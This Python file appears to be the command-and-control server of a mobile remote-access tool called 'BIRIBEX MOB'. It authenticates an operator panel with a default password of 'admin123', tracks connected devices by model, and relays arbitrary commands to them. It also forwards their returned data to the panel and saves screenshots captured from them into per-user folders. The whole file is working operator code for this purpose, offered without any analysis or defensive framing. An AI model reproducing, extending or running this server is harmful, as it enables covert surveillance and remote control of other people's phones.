import asyncio
import json
import time
import os
from datetime import datetime

try:
    import websockets
except ImportError:
    os.system("pip install websockets")
    import websockets

LOGS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
USERS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "USERS")
SCREENSHOTS_DIR = USERS_DIR

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    try:
        log_dir = os.path.join(LOGS_DIR, "server")
        os.makedirs(log_dir, exist_ok=True)
        with open(os.path.join(log_dir, "server.log"), "a") as f:
            f.write(line + "\n")
    except:
        pass

def save_user_data(client_id, data):
    try:
        user_dir = os.path.join(USERS_DIR, client_id)
        os.makedirs(user_dir, exist_ok=True)
        with open(os.path.join(user_dir, "info.json"), "w") as f:
            json.dump(data, f, indent=2)
    except:
        pass

def save_screenshot(client_id, image_data):
    try:
        ss_dir = os.path.join(SCREENSHOTS_DIR, client_id, "ScreenCaps")
        os.makedirs(ss_dir, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(ss_dir, f"screen_{ts}.png")
        with open(filepath, "wb") as f:
            f.write(image_data)
        log(f"Screenshot saved: {filepath}")
        return filepath
    except Exception as e:
        log(f"Screenshot save error: {e}")
        return None

class BIRIBEXServer:
    def __init__(self):
        self.panel_password = os.environ.get("PANEL_PASSWORD", "admin123")
        self.client_key = os.environ.get("CLIENT_KEY", "BIRIBEX_MOB_KEY_2026")
        self.clients = {}
        self.panels = set()
        self.port = int(os.environ.get("PORT", "8080"))

    async def handler(self, websocket):
        client_id = None
        is_panel = False
        try:
            first_msg = await asyncio.wait_for(websocket.recv(), timeout=30)
            first_pkt = json.loads(first_msg)
            first_type = first_pkt.get("Type", "")

            if first_type == "auth":
                is_panel = True
                password = first_pkt.get("Data", "")
                if password == self.panel_password:
                    await websocket.send(json.dumps({"Type": "auth", "Data": "ok"}))
                    log(f"Panel authenticated: {websocket.remote_address}")
                else:
                    await websocket.send(json.dumps({"Type": "auth", "Data": "failed"}))
                    log(f"Panel auth FAILED: {websocket.remote_address}")
                    return

                self.panels.add(websocket)
                try:
                    async for message in websocket:
                        await self.handle_panel(websocket, message)
                except websockets.exceptions.ConnectionClosed:
                    pass
                finally:
                    self.panels.discard(websocket)
                    log("Panel disconnected")

            elif first_type == "connect":
                info_str = first_pkt.get("Data", "{}")
                info = json.loads(info_str) if isinstance(info_str, str) else info_str
                client_id = first_pkt.get("ClientID", "")
                info["ID"] = client_id
                info["IsOnline"] = True
                info["LastPing"] = time.time()
                info["ConnectedAt"] = datetime.now().isoformat()
                info["socket"] = websocket
                self.clients[client_id] = info
                save_user_data(client_id, {k: v for k, v in info.items() if k != "socket"})
                log(f"Client ONLINE: {client_id} ({info.get('DeviceModel', '?')})")
                safe = {k: v for k, v in info.items() if k != "socket"}
                await self.notify_panels({"Type": "connect", "ClientID": client_id, "Data": json.dumps(safe)})
                await websocket.send(json.dumps({"Type": "connect_ack", "ClientID": client_id, "Data": "ok"}))

                try:
                    async for message in websocket:
                        cid = await self.handle_client(websocket, message, client_id)
                        if cid:
                            client_id = cid
                except websockets.exceptions.ConnectionClosed:
                    pass
                finally:
                    if client_id and client_id in self.clients:
                        self.clients[client_id]["IsOnline"] = False
                        log(f"Client offline: {client_id}")
                        await self.notify_panels({"Type": "disconnect", "ClientID": client_id, "Data": ""})

            elif first_type == "heartbeat":
                client_id = first_pkt.get("ClientID", "")
                if client_id in self.clients:
                    self.clients[client_id]["LastPing"] = time.time()
                    self.clients[client_id]["IsOnline"] = True
                    self.clients[client_id]["socket"] = websocket
                await websocket.send(json.dumps({"Type": "heartbeat", "Data": "pong", "ClientID": client_id}))

                try:
                    async for message in websocket:
                        cid = await self.handle_client(websocket, message, client_id)
                        if cid:
                            client_id = cid
                except websockets.exceptions.ConnectionClosed:
                    pass
                finally:
                    if client_id and client_id in self.clients:
                        self.clients[client_id]["IsOnline"] = False
                        log(f"Client offline: {client_id}")
                        await self.notify_panels({"Type": "disconnect", "ClientID": client_id, "Data": ""})
            else:
                log(f"Unknown first message type: {first_type}")

        except asyncio.TimeoutError:
            log(f"Connection timeout: {websocket.remote_address}")
        except websockets.exceptions.ConnectionClosed:
            pass
        except Exception as e:
            log(f"Handler error: {e}")

    async def handle_panel(self, ws, raw):
        try:
            packet = json.loads(raw)
            ptype = packet.get("Type", "")
            client_id = packet.get("ClientID", "")
            data = packet.get("Data", "")

            if ptype == "heartbeat":
                await ws.send(json.dumps({"Type": "heartbeat", "Data": "pong"}))
                return

            if ptype == "command":
                await self.route_to_client(client_id, packet)
                log(f"CMD -> {client_id}: {data[:80] if isinstance(data, str) else ''}")
                return

            if ptype == "get_clients":
                clients_out = []
                for cid, info in self.clients.items():
                    safe = {k: v for k, v in info.items() if k != "socket"}
                    clients_out.append(safe)
                resp = json.dumps({"Type": "client_list", "ClientID": "", "Data": json.dumps(clients_out)})
                await ws.send(resp)
                return

        except Exception as e:
            log(f"Panel error: {e}")

    async def handle_client(self, ws, raw, current_client_id):
        try:
            packet = json.loads(raw)
            ptype = packet.get("Type", "")
            client_id = packet.get("ClientID", "") or current_client_id
            data = packet.get("Data", "")

            if ptype == "heartbeat":
                if client_id in self.clients:
                    self.clients[client_id]["LastPing"] = time.time()
                    self.clients[client_id]["IsOnline"] = True
                    self.clients[client_id]["socket"] = ws
                await ws.send(json.dumps({"Type": "heartbeat", "Data": "pong", "ClientID": client_id}))
                return client_id

            if client_id and ptype:
                await self.notify_panels({"Type": ptype, "ClientID": client_id, "Data": data})
                log(f"DATA <- {client_id}: {ptype}")

            return client_id
        except Exception as e:
            log(f"Client error: {e}")
            return current_client_id

    async def route_to_client(self, client_id, packet):
        if client_id in self.clients:
            ws = self.clients[client_id].get("socket")
            if ws:
                await ws.send(json.dumps(packet))
            else:
                log(f"Client {client_id} has no socket")
        else:
            log(f"Client {client_id} not found")

    async def notify_panels(self, packet):
        msg = json.dumps(packet)
        dead = set()
        for panel in self.panels:
            try:
                await panel.send(msg)
            except:
                dead.add(panel)
        self.panels -= dead

    async def start(self):
        log("=" * 50)
        log("       BIRIBEX MOB SERVER v4.5.4")
        log("=" * 50)
        log(f"Server port: {self.port}")
        log("=" * 50)

        server = await websockets.serve(self.handler, "0.0.0.0", self.port)
        log(f"Server READY on port {self.port} - waiting for connections...")
        await server.wait_closed()

if __name__ == "__main__":
    server = BIRIBEXServer()
    asyncio.run(server.start())
